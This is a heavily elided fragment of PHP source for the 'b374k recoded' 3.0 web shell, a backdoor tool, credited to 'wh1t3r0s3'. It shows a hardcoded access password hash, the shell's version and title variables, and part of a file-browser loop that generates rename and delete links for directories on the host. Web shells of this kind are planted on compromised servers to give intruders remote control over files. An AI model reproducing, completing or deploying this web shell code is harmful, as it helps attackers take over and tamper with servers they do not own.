...
/*
	...
	Recoded by wh1t3r0s3

*/
$s_pass = "fb621f5060b9f65acf8eb4232e3024140dea2b34";

$s_ver = "3.0"; // shell ver
$s_title = "b374k recoded ".$s_ver;
	...
	foreach($s_list as $s_l){
		...
		if(@is_dir($s_l)){
			...
			elseif($s_l==".."){
				...
				t:tukar('".cs($s_l)."_','','rename','".adds($s_l)."','".adds($s_l)."');\">ren</a> | <a href='".$s_self."cd=".pl($s_cwd)."&del=".pl($s_l)."'>del</a></span><div id='".cs($s_l)."__form'></div>";
				$s_total_dir++;
			}
			$s_lname = "[ ".$s_l." ]";
			$s_lsizetit = "0";
